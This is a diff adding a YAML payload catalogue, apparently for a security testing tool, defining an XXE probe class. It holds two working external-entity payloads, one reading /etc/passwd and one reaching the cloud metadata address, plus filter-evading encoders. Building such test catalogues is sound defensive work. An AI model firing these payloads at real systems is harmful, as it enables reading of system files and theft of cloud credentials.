@@ -1,0 +1,7 @@
+schema: 'rsecopsx.payloads/v1'
+classes:
+  - id: 'xxe'
+    cwe: 'CWE-611'
+    description: 'XML external entity probes for parser sinks.'
+    payloads: ['<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>']
+    encoders: ['url', 'double_encode', 'null_byte']
